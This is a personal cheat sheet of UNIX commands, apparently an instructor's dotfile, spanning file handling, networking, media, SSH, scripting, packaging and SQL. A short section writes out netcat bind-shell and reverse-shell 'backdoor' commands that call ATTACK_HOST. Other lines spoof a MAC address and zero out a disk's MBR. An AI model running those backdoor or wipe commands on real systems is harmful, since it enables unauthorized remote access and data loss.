.always_forget.txt
#
# awdeorio's notes on UNIX commands

# Users and Groups
adduser john                            # add user w/ system defaults
useradd -m -G users,wheel -s /bin/bash USER # add new USER manually
usermod -u UID username                 # change UID
usermod -g GID username                 # change default group
groupmod -g GID group                   # change GID of group
gpasswd -a awdeorio audio               # add awdeorio to audio group
smbpasswd -a username                   # new Samba user
chsh -s /bin/bash username              # change default shell
id                                      # print user and group ID #'s
ulimit -a                               # per-user system limits
groups                                  # list group membership
users                                   # list users logged in
w                                       # list users logged in
who                                     # list users logged in
finger USER                             # directory info about USER
whoami                                  # current user

# Machines
hostname                                # name of this computer
uname                                   # operating system name
uname -a                                # info about OS, compiler, etc.
cat /proc/cpuinfo                       # CPU size/features
cat /proc/meminfo                       # memory size/features
uptime                                  # time since power on

# Files
ls                                      # list directory contents
ls -l                                   # include time, size, etc.
ls -a                                   # include hidden files
ls -t                                   # sort by time
stat FILE                               # file modification times, etc.
touch FILE                              # update modification time to NOW
touch FILE                              # create empty file, if it doesn't exist

# Paths
pwd                                     # current directory
pwd -P                                  # current directory, absolute path
readlink -f PATH                        # absolute path (GNU only)
cd                                      # change to home directory
cd ..                                   # change to directory up
cd DIR                                  # change to directory
cd -                                    # return to previous directory
cd $(dirname "$BASH_SOURCE") && pwd -P  # absolute path of sourced script
lsof                                    # list open files

# Finding files
find . hello.txt                        # find hello.txt, starting at PWD
find / hello.txt                        # find hello.txt, starting at /
find . '*.txt'                          # txt files
find . '*hello*'                        # anything with "hello" in the filename
find . -type f                          # plain files
find . -type d                          # directories
find . -name '*~' -exec rm -v {} \;     # remove tilde files
locate hello.txt                        # search system database for hello.txt
grep -r SEARCH .                        # recursively search file content
grep -rI SEARCH .                       # ^^^ ignoring binary files

# Superuser permissions
su                                      # switch user to root
su USER                                 # switch user to USER
sudo -s                                 # switch user to root
sudo CMD                                # run CMD as root
sudo CMD                                # run CMD as root
sudo -u USER CMD                        # run CMD as USER
sudoedit FILE                           # edit file as root

# Processes and Threads
ps                                      # View my threads
ps -u johndoe                           # Another user's processes
ps -ax                                  # All processes on the machine
ps -axM                                 # All processes and threads
top                                     # Dynamic view of processes
top -H                                  # Dynamic view of threads
top -b -n7 -d0.5 | grep ^Cpu | sed 1d | grep -oE '[0-9]+\.?[0-9]*% *id' | grep -oE '[0-9]+\.?[0-9]*' | awk '{sum+=$0} END {print sum/NR}' # CPU usage (%)
pgrep                                   # search for processes, return PID
kill PID                                # kill process with PID
kill -9 PID                             # kill process using signal 9
killall NAME                            # kill all processes with NAME
killall -9 NAME                         # kill all using signal 9
CMD &                                   # start CMD in the background
fg                                      # bring background command to foreground
[control-z]                             # suspend current CMD
bg                                      # send suspended CMD to background
nohup CMD &                             # logout won't stop CMD
nohup nice CMD &                        # lower priority
nohup CMD < /dev/null > LOG 2>&1        # redirect all streams

# Commonly used signals
1       HUP (hang up)
2       INT (interrupt)
3       QUIT (quit)
6       ABRT (abort)
9       KILL (non-catchable, non-ignorable kill)
14      ALRM (alarm clock)
15      TERM (software termination signal)

# Paths
which CMD                               # print path to CMD
whereis CMD                             # print all paths to CMD
export PATH=$PATH:NEW_DIR               # add new directory to PATH (bash)

# Manual network configuration (DHCP)
killall dhcpcd
ifconfig eth1 down
ifconfig eth1 hw ether '00:16:cb:05:3b:10'  # spoof MAC addr
iwconfig eth1 key s:nebardupover3
iwconfig eth1 essid DeOrio
ifconfig eth1 up
dhcpcd -t 10 -N eth1

# Manual network configuration (static IP)
# NOTE: many of these commands are replaced by the "ip" program's subcommands
nmap -sP '141.212.106.*'  # see what IP addresses are inuse
dig -x 141.212.106.7      # verify that my IP is not in DHCP space
ifconfig eth0 down
ifconfig eth0 141.212.106.7 broadcast 141.212.106.255 netmask 0xffffff80 up
route flush     # remove all routes
route add default gw 141.212.106.1
edit /etc/resolv.conf
  > search eecs.umich.edu
  > nameserver 141.213.4.4
  > nameserver 141.213.4.5
  > nameserver 141.213.13.31

# Network Utilities
ping google.com                         # Check if a host is up
ping -c3 google                         # Only send 3 packets
host www.google.com                     # DNS lookup
dig www.google.com                      # DNS lookup
dig +short www.google.com               # DNS lookup, scriptable
nslookup                                # DNS lookup
nslookup -type=ns eecs.umich.edu        # DNS with authortative name servers
dig -x 141.212.106.7                    # reverse DNS lookup
dig +short -x 141.212.106.7             # reverse DNS lookup, scriptable
whois www.google.com                    # domain name registration info
nmap -A -T4 snoopy.eecs.umich.edu       # what ports are open?
nmap -sn -PR 192.168.0.0/24             # which hosts are up my subnet?
netstat -at                             # list TCP connections
netstat -au                             # list UDP connections
netstat -ant                            # disable DNS lookup (faster)
netstat -tl                             # listening TCP connections
netstat -atn | grep ':22'               # ssh connections on this machine?
netstat -l numeric-ports | grep 80      # what's using port 80?
sudo fuser -v -n tcp 80                 # who's using port 80?
nc HOST PORT                            # intiate connection "cat over a socket"
nc -l HOST PORT                         # listen for incoming connection
nc -v HOST PORT                         # check connection to HOST on PORT
wget https://www.google.com/            # download one page
wget -m andrewdeorio.com                # download everything
traceroute                              # route packets take to network host
curl --verbose                          # watch protocol in action
curl --trace-ascii log.txt              # watch protocol in action, more detail
curl --trace-ascii log.txt --trace-time # include timing
curl --data "query=aa" http://localhost:5000/query # send POST request
curl -H "Content-type: application/json" \         # POST JSON
     -X POST http://127.0.0.1:5000/ \
     -d '{"message":"Hello Data"}'
telnet HOST 80                          # connect to web server
tcpdump                                 # watch packets on all network ifcs
tcpdump -i eth0                         # watch packets on one network interface
tcpdump tcp                             # only one protocol
tcpdump port 80                         # only one port
tcpdump host 1.2.3.4                    # only one host
tcpdump dst 1.2.3.4                     # only one dest
tcpdump src 1.2.3.4                     # only one source
tcpdump -S "tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0" # 3-way handshake
tcpdump -S "port 80 and (tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0)" #  3-way handshake on port 80
tcpdump -S "host web.eecs.umich.edu and port 80 and (tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0)"   # 3-way handshake on port 80
tcpdump -S -s0 -A port 80               # Sniff HTTP packets in ASCII format
iftop                                   # display bandwidth usage
python -m SimpleHTTPServer 8000         # start a file server at ./ on port 8000

# Backdoor shell using netcat
# Note: this version of netcat (ncat) ships with nmap
TARGET_HOST $ ncat -lvp 8080 -e /bin/bash --ssl
ATTACK_HOST $ ncat TARGET_HOST 8080 --ssl

# Backdoor reverse shell using netcat
# This works when the firewall prevents incoming connections
# Note: this version of netcat (ncat) ships with nmap
ATTACK_HOST $ ncat -l -p 8080 -vv --ssl
TARGET_HOST $ ncat -e /bin/bash ATTACK_HOST 8080 --ssl

# Email
sendmail user@example.com < email.txt   # send email from CLI
sendmail -t < email.txt                 # read "TO" field from file

# Audio
alsamixer                               # change volume
amixer -c 0 sset Master '6%+'           # change volume
amixer -c 0 sset Headphone toggle       # toggle speakers/headphones
mplayer "$(ls | shuf -n1)"              # select and play a random file

# Video
# Read video device live
mplayer tv:// -tv driver=v4l2:width=352:height=288:device=/dev/video0 -fps 20
mplayer tv://
vlc v4l2:///dev/video0
# Record video only
mencoder tv:// -tv driver=v4l2:width=352:height=288:device=/dev/video0 -fps 20 -nosound -ovc lavc -o file.avi
# Record video+sound
mencoder tv:// -tv driver=v4l2:width=352:height=288:device=/dev/video0:forceaudio:adevice=/dev/dsp -fps 20 -ovc lavc -oac mp3lame -lameopts cbr:br=64:mode=3 -o file.avi
# convert VOB file (from a DVD) to mp4   http://stackoverflow.com/questions/13560852/convert-mp4-to-maximum-mobile-supported-mp4-using-ffmpeg
ffmpeg -i concat:"/media/dvd/VIDEO_TS/VTS_01_1.VOB|/media/dvd/VIDEO_TS/VTS_01_2.VOB" -acodec libfaac -aq 100 -ac 2 -vcodec libx264 -vpre slow -crf 24 -threads 0 output.mp4
# compress mp4 video to 480p at 500kbit/s mp4
ffmpeg -i input.mp4 -vcodec libx264 -vprofile high -preset slow -b:v 500k -maxrate 500k -bufsize 1000k -vf scale=-1:480 -threads 0 -b:a 128k output_file_480p.mp4
# compress mp4 video to 360p at 250kbit/s mp4
ffmpeg -i input.mp4 -vcodec libx264 -vprofile baseline -preset slow -b:v 250k -maxrate 250k -bufsize 500k -vf scale=-1:360 -threads 0 -ab 96k output_360p.mp4
# Stream live video
cvlc v4l2:///dev/video0 :v4l2-standard= :input-slave=alsa://hw:0,0 :live-caching=300 :sout="#transcode{vcodec=WMV2,vb=800,scale=1,acodec=wma2,ab=128,channels=2,samplerate=44100}:http{dst=:8080/stream.wmv}"
# Stream live video without audio
cvlc v4l2:///dev/video0 :v4l2-standard= :live-caching=300 :sout="#transcode{vcodec=WMV2,vb=800,scale=1,select=noaudio}:http{dst=:8080/stream.wmv}"
# Stream live video without audio, and lower frames-per-second (10)
cvlc v4l2:///dev/video0 :v4l2-standard= :live-caching=300 :sout="#transcode{vcodec=WMV2,vb=800,scale=1,fps=10,select=noaudio}:http{dst=:8080/stream.wmv}"
# View live video stream
vlc http://HOST:8080/stream.wmv
mplayer http://HOST:8080/stream.wmv

# Images
mogrify -rotate 90                     # rotate
mogrify -resize 640x640                # reduce resolution
exiftool                               # read all exif data
exiftool '-AllDates+=3:02:00 00:00:00' # date/time += 3 yr 2 mos
convert FILE.png FILE.jpg              # convert image file type
convert IN.jpg -monochrome OUT.jpg     # convert image to black and white

# SSH
ssh HOST                               # connect to HOST
ssh USER@HOST                          # connect to HOST as USER
ssh USER@HOST CMD                      # run command on remote host
ssh -vT HOST                           # debug authentication issues
ssh -L 5901:localhost:5900 HOST        # port forwarding
vncviewer localhost:1                  # (now use forwarded port)
scp FILE HOST:                         # copy file to remote host over SSH
scp -r DIR HOST:                       # copy directory
rsync -avz DIR HOST:PATH/              # archive over the network
rsync -a                               # archive, equivalent to -rlptgoD
rsync -r                               # recursive
rsync -l                               # copy symlinks as symlinks
rsync -p                               # preserve permissions
rsync -t                               # preserve times
rsync -g                               # preserve group
rsync -o                               # preserve owner
rsync -D                               # preserve devices and special files
rsync -v                               # verbose
rsync -z                               # compress
rsync -P                               # progress bar
rsync -rvt                             # copy from USB stick

# Start remote vnc session
server $ vncserver -localhost -NeverShared
client $ ssh -N -L 5901:localhost:5901 server.eecs.umich.edu
client $ vncviewer localhost:1
# edit server:~/.vnc/.vnc/xstartup to change xsession to gnome, etc.
server $ vncserver -kill :1  # end vnc server

# Intel SSH
cygwin $ export SSH_SOCKS_SERVER='socks://proxy-socks.jf.intel.com:1080'
cygwin $ ssh2.exe -L 22:localhost:22 ariel.eecs.umich.edu -s service
# now you can use ssh or svn
cygwin $ scp file localhost: # really sends the file to ariel.eecs.umich.edu

# Open an .rdp file for remote login to virtualsites
tsclient -x connect.rdp                       
rdesktop server:port -u awdeorio@UMICH.EDU

# Bash
echo "hello world"                      # print stdout
echo "hello world" >&2                  # print to stderr
echo "hello world" > FILE               # print file
echo "hello world" >> FILE              # append file
CMD > /dev/null                         # ignore stdout
CMD 2> /dev/null                        # ignore stderr
CMD &> /dev/null                        # ignore both stdout and stderr
CMD 2>&1                                # copy stderr to stdout
CMD 2>&1 | less                         # copy stderr to stdout and view
<( CMD )                                # create a temporary named pipe 
diff <(echo a) <(echo b)                # diff the output of two commands
exec > >(tee logfile.txt); exec 2>&1;   # copy stdout and stderr to log file
$#                                      # argc in bash
[ $# -lt 1 ] && exit 1                  # check # args and quit
$@                                      # argv in bash
$0                                      # argv[0] in bash
LOGFILE=${TXTFILE%.txt}.log             # change file extension
set -o verbose                          # echo commands to stdout
cd $(dirname "$BASH_SOURCE") && pwd -P  # absolute path of sourced script
eval                                    # run in current shell
exec                                    # spawn a new shell to replace current
TAB=$'\t'                               # TAB literal 
echo "hello" | tee >(cat) >(cat)        # copy stdout to two commands
set -e                                  # Abort on non-zero NOTE: pipes break it
EXTENSION="${FILENAME##*.}"             # Parse file extension
CSVFILE="${TXTFILE%.txt}.csv"           # Change file extension


# Scripting
yes                                     # keep printing "y" over and over
yes | INSTALL_CMD                       # answer yes to all installer questions
yes > file                              # quickly generate a big file
exit N                                  # exit N
true                                    # exit zero
false                                   # exit non-zero
trap FUNC 1 2 3 15                      # run FUNC on receiving a signal
tee FILE                                # copy stdin to both stdout and FILE
echo hello | tee FILE                   # write "hello" to both stdout and FILE
mktemp                                  # create a temporary file
mktemp -t PREFIX                        # ^^^ starting with PREFIX
mktemp -d                               # create a temporary directory
basename /bin/bash                      # returns "bash"
dirname /bin/bash                       # return "/bin"

# crontab format
 +---------------- minute (0 - 59)
 |  +------------- hour (0 - 23)
 |  |  +---------- day of month (1 - 31)
 |  |  |  +------- month (1 - 12)
 |  |  |  |  +---- day of week (0 - 6) (Sunday=0 or 7)
 |  |  |  |  |
 *  *  *  *  *  command to be executed

# grep
grep PATTERN                            # search for pattern
egrep PATTERN                           # extended regex
grep -P                                 # Perl regex
grep -o                                 # only print the matched pattern
zgrep                                   # for .gz files
grep -v                                 # invert match
grep -A10                               # print match + 10 lines after
grep -B10                               # print match + 10 lines before
grep -a -b -B100 -A100 phrase /dev/sda3 # recover deleted files
egrep -o "\w+([._-]\w)*@\w+([._-]\w)*\.\w{2,4}" -e  # email addresses
# grep for tab in bash: Ctrl-V TAB
grep '^.\{10\}$'                        # 10 letter words

# sed
sed -r                                  # use extended regex
sed 1d                                  # print all but first line
sed '$d'                                # print all but last line
sed -n '52p'                            # print line 52
sed '52q;d'                             # ^^^ efficient on large files
sed -n '45,50p' filename                # print lines 45-50
sed -n '51q;45,50p' filename            # ^^^ efficient on large files
sed -n '/BEGIN/,/END/p'                 # print lines between "BEGIN" and "END"
sed -e '/before/q'                      # stop when line matches "before"
sed -i -e 's/before/after/g' file.txt   # replaces "before" with "after"
perl -pi -e 's/old_string/new_string/g' # ^^^ perl alternative
sed 's/\([a-z]*\).*/\1/'                # keep only lowercase letters
sed 's/^/before/'                       # prepend each line matching "before"
sed '/before/d'                         # filter lines matching "before"
sed -nr 's/@@  ([0-9]+\.?[0-9]*) ns total time to execute/\1/p'
sed '1s/before/after/'                  # replace first line
FIXME: sed search and THEN do replace, e.g., '/searchterm/s/query/replace/'

# awk
awk '/Iowa/,/Montana/'                  # print lines between Iowa & Montana, 
awk '{print $NF}'                       # print last field
awk '{print $(NF-1)}'                   # print second-to-last field
awk '{$1="";print}'                     # print all but last field
awk '$1>=2{print}                       # print if greater that 2
awk '{ sum += $1 }; END { print sum }'  # sum input stream
awk '{print length}'                    # length of each line
awk '{print length($1)}'                # length of first word
awk '{a[$1]+=$2}END{for(i in a) print i,a[i]}' # sum vals (col2) by key (col2)
awk '/match/,/*/'                       # remove from match to end of file

# Misc text processing
cat FILE1                               # print file to terminal
cat FILE1 FILE2                         # print files to terminal
cat -n                                  # prepend line numbers
cut -c8-                                # remove first 8 characters of a line
fold                                    # word-wrap text
column -tns, FILE.csv                   # pretty-print a csv file
test `tail -c 1 file`                   # test if file ends in newline
expand                                  # converts tabs into spaces
tac                                     # reverse order of lines
rev                                     # reverse order of characters
paste                                   # print two files side-by-side
tr "\r\n" "\n"  FILE                    # convert line endings to UNIX
fromdos                                 # convert line endings to UNIX
dos2unix                                # convert line endings to UNIX (old)
tr -d -c ',\n' | awk '{print length}'   # count commas
shuf                                    # shuffle lines
file FILE                               # determine encoding of FILE
iconv -f UTF-8 -t ASCII//TRANSLIT       # convert UTF8 to ASCII
head                                    # first 10 lines
head -n2                                # first 2 lines
head -n-2                               # all but last 2 lines
tail                                    # last 10 lines
tail -n2                                # last 2 lines
tail -n+2                               # from from line 2 to end
tail -f                                 # monitor file for appends
wc                                      # word, line, character and byte count
wc -l                                   # line count
sort                                    # sort lines
sort -n                                 # numeric order
sort | uniq                             # print only unique lines
sort -u                                 # print only unique lines
sort -k1,1                              # sort with only column 1 (first) as key
/usr/share/dict/words                   # All the words in the dictionary
shuf /usr/share/dict/words | head -n1   # random word

# Printing
enscript FILE                           # pretty-print text file
lpr                                     # print file
lprm -P<printer>                        # remove one job from queue
lpq  -P<printer>                        # show printer queue status
lpstat -t                               # show all status info for all printers
cupsdisable <printer>                   # stop printer
cupsenable  <printer>                   # start printer

# Filesystems
fsck -aC /dev/<device>                  # check disk with progress bar, no ?'s
touch /forcefsck && reboot              # force filesystem check on reboot
dd if=/dev/cdrom of=my_cd_image.iso     # Rip ISO from CDROM
mount with "shortname=mixed"            # mount FAT32
rsync -rvt --delete --modify-window=1   # copy from FAT32
rsync -rv --delete --checksum           # copy from FAT32, using file checksum

# Disk imaging over a network
# create a backup of client to server
SERVER $ nc -p 2222 -l > FILE.img                     # start backup, server
CLIENT $ dd if=/dev/sda bs=16M | nc SERVER 2222       # start backup, client
CLIENT $ nc -p 2222 -l > /dev/sda                     # start restore, client
SERVER $ dd if=FILE.img bs=16M | nc CLIENT 2222       # start restore, server

# Back up and restore MBR excluding partition table
dd if=/dev/sda of=/home/herman/MBR.img bs=446 count=1 # backup MBR
dd if=/home/herman/MBR.img of=/dev/sda bs=446 count=1 # restore MBR
dd if=/dev/zero of=/dev/hda bs=446 count=1            # kill MBR, except table
dd if=/dev/zero of=/dev/hda bs=512 count=1            # kill ENTIRE MBR

# Permissions
chown USER                              # change owner
chown -R USER                           # change owner recursively
chgrp GROUP                             # change group
chgrp -R GROUP                          # change group recursively
chmod -r                                # remove read permissions
chmod -w                                # remove write permissions
chmod -x                                # remove execute permissions
chmod +r                                # add read permissions
chmod +w                                # add write permissions
chmod +x                                # add execute permissions
chmod u-rwx                             # remove rwx access for user
chmod g-rwx                             # remove rwx access for group
chmod o-rwx                             # remove rwx access for others
chmod 777                               # EVERYONE can do EVERYTHING
find . -type f -exec chmod 600 {}\;     # change permissions for files only
find . -type d -exec chmod 700 {}\;     # change permissions for dirs only
umask                                   # view mask for default file permissions

# AFS
kdestroy                                # delete Kerberos tickets
unlog                                   # delete AFS tokens
kinit [-5] [-l 30d] [awdeorio@UMICH.EDU]# get Kerberos ticket
aklog                                   # get AFS tokens
aklog -cell umich.edu -k UMICH.EDU      # AFS tokens for UMICH cell
aklog -cell eecs.umich.edu -k UMICH.EDU # AFS tokens for EECS cell
gssklog -cell engin.umich.edu           # AFS tokens for ENGIN cell
fs setacl -dir DIR -acl USER rlidwk     # give USER access to directory
find DIR -type d -exec fs setacl -dir {} -acl USER rlidwk \;  # give USER access to DIR, recursively
find DIR -type d -exec fs setacl -dir {} -acl USER rlidwka \; # give USER access to DIR, recursively, with admin (note the "a")

# NFS
showmount -e 192.168.0.100              # see what's available
mount 192.168.0.100:/volume1/public nas # mount NFS volume

# Hardware and detection
top                                     # current memory usage
free                                    # memory only
cat /proc/cpuinfo                       # CPU information
cat /proc/meminfo                       # Memory information
lspci                                   # see PCI devices
hwinfo                                  # all hardware
xinput --list                           # see available input devices

# Converting docs
enscript FILE.txt -o - | ps2pdf - FILE.pdf  # txt to pdf
fromdos                                 # convert line endings to UNIX
dos2unix                                # convert line endings to UNIX (old)
pdftk PATH/*.pdf cat output output.pdf  # join pages
pdfjoin *.pdf                           # join pages
pdfunite *.pdf out.pdf                  # join pages
pdftk FILE.pdf burst                    # split pages
pdfseparate in.pdf 'out-%d.pdf'         # split pages
xlhtml                                  # convert excel files
pdftotext                               # convert pdf to text
pdftotext -layout                       # convert pdf to text, preserving layout

# Date and time
date '+%s'                                        # current time in seconds
date --date='Thu Nov  4 09:08:49 EDT 2010' '+%s'  # parse a date and reformat
date --date="1970-01-01 1187769064 sec GMT"       # Unix time to human
date --date @1187769064                           # Unix time to human
TZ='America/Detroit'; export TZ                   # change time zone
ntpdate europe.pool.ntp.org north-america.pool.ntp.org # sync clock

# GNU parallel
ls *.tar.gz | parallel -v -j3 tar -xvzf # untar, 3 jobs in parallel
ls *.tar.gz | xargs -P3 tar -xvzf       # alternative using xargs
parallel --verbose                      # print cmd before executing it
parallel -v                             # print cmd+output after executing it
parallel -j+0                           # untar, use all CPUs
*/ -d | sed 's_/$__' | parallel -v -j+0 tar -cjf {}.tar.bz2 {}/ # create tar
killall -USR1 parallel                  # get list of running jobs
killall -TERM parallel                  # finish running jobs, no new jobs
echo > q; tail -f q | parallel          # start job queue
echo my_command my_arg >> q             # submit to job queue

# File differences
diff file1 file2                        # view differences of two files
diff <(echo a) <(echo b)                # diff the output of two commands (bash)
diff3 file1 file2 file3                 # diff three files
sdiff                                   # same as diff --side-by-side
diff file1 file2 > patch.txt            # save a patch
patch < patch-dell-e6510                # apply a patch from diff

# Shell math
expr 1 / 2                              # integer only
let A=1/2                               # integer only
echo "1 / 2" | bc -l                    # floating point
dc -e "3 k 1 2 /p"                      # floating point
sort file1 | uniq                       # unique patterns
sort file1 file2 | uniq                 # union
sort file1 file2 | uniq -d              # intersection
sort file1 file2 | uniq -u              # symmetric difference
cat FILE | sort | uniq -c               # frequency analysis (histogram)

# Compression
tar -cjf DIR.tar.bz2 DIR/               # compress directory
tar -xvjf DIR.tar.bz2                   # decompress directory
tar -xvjOf DIR.tar.bz2                  # cat tarball files to stdout
tar -tvjf DIR.tar.bz2                   # list contents of tarball
tar -xvjf DIR.tar.bz2 FILE              # extract FILE from tarball
zip --encrypt -r folder folder          # create encrypted zip archive
bzip2 FILE.bz2                          # compress a single file
bzcat FILE.bz2                          # dump compressed file to stdout
bunzip2 FILE.bz2                        # decompress a single file
gzip FILE.gz                            # compress a single file
gunzip FILE.gz                          # decompress a single file
zcat FILE.gz                            # dump compressed file to stdout
zgrep FILE.gz                           # grep for compressed files
zdiff FILE1.gz FILE2.gz                 # diff for compressed files
cat FILE.txt | gzip -f > FILE.txt.gz    # pipe into gzip

# Encryption
encfs ROOTDIR MOUNTPOINT                # (first time) create encrypted virtual folder
encfs ROOTDIR MOUNTPOINT                # mount
fusermount -u MOUNTPOINT                # unmount / Linux
umoount MOUNTPOINT                      # unmount / Darwin
encfsctl passwd ROOTDIR                 # change password
md5sum                                  # compute hash
md5sum -                                # random password: type, then CTRL-D
shasum                                  # compute hash
gpg                                     # encrypt/decrypt text file
openssl                                 # CLI to OpenSSL library
crypto FILE                             # encrypt to FILE.crypt
decrypto FILE.crypt                     # decrypt to FILE

# Serial ports
dmesg | grep /dev/tty                   # recently connected devices
screen /dev/ttyACM0 9600                # text input/output at 9600 Baud
                                        #   Ctrl-A,Shift-K to quit
# Virtual terminals
screen                     # start virtual terminal
screen -S NAME             # start virtual terminal named NAME
screen -r NAME             # attach to NAME
screen -ls                 # list sessions
[screen] C-a d             # detach
tmux                       # start virtual terminal
tmux new -s NAME           # start virtual terminal named NAME
tmux a                     # attach
tmux a -t NAME             # attach to NAME
tmux ls                    # list sessions
tmux kill-session -t NAME  # kill session NAME
[tmux] C-b d               # detach
[tmux] C-b 0               # select window 0
[tmux] C-b n               # next window
[tmux] C-b p               # previous window

# Meta commands
watch CMD                  # run CMD over and over
watch -n0.5 CMD            # run CMD every 0.5s
tail -f FILE               # watch file for appends
 ... | xargs CMD           # run CMD on each line of input

# Mount CD/DVD image
mount -o loop file.img /home/awdeorio/mnt/loop

# Change a bunch of file extensions using bash
ls *.txt | sed 'p;s/.C$/.cpp/' | xargs -L2 mv -v

# Random
shuf                                    # shuffle lines
shuf -i 1-100 -n 1                      # Random number between [1, 100]
dd bs=1M count=1 if=/dev/urandom of=FILE# create a 1M file with random content
md5sum -                                # random password: type, then CTRL-D


########################################
# Windows / Cygwin

# open a file as if you double-clicked it
cygstart.exe FILE


########################################
# OSX
open FILE                               # open a file, same as double-click
open -a "Google Chrome" FILE            # open a file with Google Chrome
pbcopy < FILE                           # copy contents of FILE to clipboard
opendiff FILE1 FILE2 [-merge FILE3]     # graphical diff
diskutil unmount /Volumes/USB_DISK      # Unmount USB_DISK
rm ~/.Trash/*                           # Empty trash

# Wifi management
ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/sbin
networksetup -listallhardwareports      # Find network inferface name
networksetup -setairportpower en0 on    # Turn on wifi
airport -s                              # Scan wireless networks
networksetup -setairportnetwork en0 SSID PASSWORD # Connect to wifi network
airport -I                              # Print current wireless status

# Create bootable live USB
# ref: http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-mac-osx
hdiutil convert -format UDRW -o target.img SOURCE.iso
mv target.img.dmg target.img
diskutil list
diskutil unmountDisk /dev/diskN
sudo dd if=./target.img of=/dev/rdiskN bs=1M # change 1M->1m for 
diskutil eject /dev/diskN

# Get rid of annoying "damaged and can't be opened" message for downloads
xattr -r -d com.apple.quarantine /Users/awdeorio/mnt/finance

# Homebrew
brew update                             # update repository
brew upgrade                            # upgrade installed packages
brew cleanup                            # remove tarballs, installers, etc.
brew cask cleanup                       # remove .dmg installers
brew linkapps                           # link to /Applications/


########################################
# Other Linux Distros

# Gentoo:emerge - USE flag descriptions:
/usr/portage/profiles/use.desc
/usr/portage/profiles/use.local.desc

# Redhat:rpm
rpm -Uvh foo-1.0-1.i386.rpm             # install a package
rpm -ev foo.rpm
rpm -ivh source-package                 # install src in /usr/src/redhat/SOURCES
                                        # install spec in /usr/src/redhat/SPECS
rpmbuild -bb thing.spec                 # build rpm
rpm -Uvh     thing.rpm                  # install rpm
rpm2cpio FILE.rpm | cpio -idmv          # extra files from rpm

# Debian/Ubuntu apt
apt-get update                          # update repository
apt-get upgrade                         # upgrade packages, but NOT kernel
apt-get dist-upgrade                    # upgrade packages, including kernel
apt-cache search <package>              # find packages
apt-cache showpkg <package>             # get the details on a package

# /etc/init.d/ scripts
update-rc.d -f autofs remove            # Ubuntu, remove
update-rc.d autofs defaults             # Ubuntu, add
chkconfig autofs off                    # Fedora/Redhat
rc-update del autofs                    # Gentoo


########################################
# Vagrant with VirtualBox
# https://www.vagrantup.com/
vagrant init                            # create new configuration Vagrantfile
vagrant up                              # boot VM
vagrant ssh                             # connect to VM
 > cd /vagrant/                         # shared directory w/host OS
vagrant halt                            # halt VM


########################################
# C++ tools
g++ -g                                  # compile with debug support
valgrind -v --leak-check=full ./a.out   # check for memory errors
g++ -pg                                 # compile with profiling support
gprof EXE gmon.out > analysis.txt       # profile
g++ -g --coverage FILE.cpp              # coverage: compile
./a.out                                 # coverage: run
gcov FILE.cpp                           # coverage: analyze
cat test.cpp.gcov | grep '^#####'       # coverage: lines that didn't execute
LIBARY_PATH                             # environment vars for tool installs
LD_LIBRARY_PATH
LD_RUN_PATH
CPATH
C_INCLUDE_PATH
CPLUS_INCLUDE_PATH
MANPATH


########################################
# Java
java -jar myprog.jar                    # run a java program
jar -xvf                                # extract all files from jar archive


########################################
# Perl 
perl -V                                 # debug environment
PERL5LIB                                # environment variable for tool installs
cpan -i PACKAGE                         # install package


########################################
# Python

# local package installs
virtualenv venv                         # create
virtualenv -p python3 venv              # create, Python 3
source ./venv/bin/activate              # enable, bash
. ./venv/bin/activate                   # enable, csh, etc.
pip install PACKAGE                     # install PACKAGE into ./venv
deactivate                              # disable

# Stop and debug
>>> import pdb; pdb.set_trace();

# Start a program in debug mode
python -m pdb script.py

# Check style
pylint FILE                             # Check FILE
pylint DIR                              # Check all source files in DIR
pylint -rn                              # Disable full report (only messages)

# Enable tab-completion and history in Python shell.  Add this to ~/.pythonrc.py
import readline, rlcompleter
readline.parse_and_bind("tab: complete")

# Start a Jupyter (formerly IPython) Notebook server on a remote server
jupyter-notebook --ip 0.0.0.0 --no-browser

# Execute a Jupyter Notebook in headless mode.  Clears all output, runs the 
# entire notebook, and writes the result to an output .ipynb file
# NOTE: `ipython nbconvert` is buggy and incorrectly times out long jobs
pip install runipy
runipy -o NOTEBOOK.ipynb # save output of each cell back to NOTEBOOK.ipynb

ipython nbconvert --to=notebook --ClearOutputPreprocessor.enabled=True --ExecutePreprocessor.enabled=True --output=OUTPUT.ipynb INPUT.ipynb

# include path for local packages
export PYTHONPATH=${HOME}/local/lib/python2.6:${PYTHONPATH}
export PYTHONUSERBASE=${HOME}/local

# Quick web server serving files in PWD on port 8000
python -m SimpleHTTPServer 

# Run command line programs as functions in Python
>>> import sh
>>> ls('-l')


####################
# PyPI howto
# ref http://peterdowns.com/posts/first-time-with-pypi.html
# NOTE: for some stupid reason, you *must* have your password in ~/.pypirc

# Build a distribution tarball locally
python setup.py sdist

# Tag a release
git tag -a X.Y
git push --tags origin master

# Test deploy to PyPI
python setup.py register -r pypitest
python setup.py sdist upload -r pypitest
open https://testpypi.python.org/pypi/MYPACKAGE/

# Live deploy to PyPI
python setup.py register -r pypi
python setup.py sdist upload -r pypi


########################################
# Ruby local install
[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm"
export PATH="$PATH:$HOME/.rvm/bin"


########################################
# SQL

# sqlite3 Linux CLI
sqlite3 file.db                         # open connection to database from file
sqlite3> .databases                     # list the databases
sqlite3> .tables                        # list the tables
sqlite3> .schema                        # show the table creation commands
sqlite3> .headers on                    # print table column names
sqlite3> .mode column                   # pretty print table columns
sqlite3> .show                          # print settings

# MySQL Linux CLI
mysqladmin -u root password PASSWORD    # change root password
mysql -u root -pPASSWORD                # connect to db (NO SPACE!!!)
mysql.server start                      # start SQL server
mysql -u user db -p                     # open db
mysql -u user -p < SCRIPT               # run script
mysqldump -u user -pPASSWD DB > file.db # dump database to file

# PostgreSQL
psql                                    # Start postgresql shell
sudo -u postgres psql                   # Start shell, Ubuntu
\l                                      # list databases
\dt                                     # list tables
\c DB                                   # connect to database

# SQL tid bits
PRIMARY KEY AUTO_INCREMENT              # avoid initializing ID's
TIMESTAMP DEFAULT CURRENT_TIMESTAMP     # avoid initializing timestamps
FOREIGN KEY (child_id)                  # add foreign key constraint to col
  REFERENCES parent_table(parent_id)    # connect to column in parent table
  ON UPDATE CASCADE                     # update child rows with parents row
  ON DELETE CASCADE                     # delete child rows with parents row
SELECT a.*, b.*                         # 2-way join AKA inner join
  FROM a JOIN b
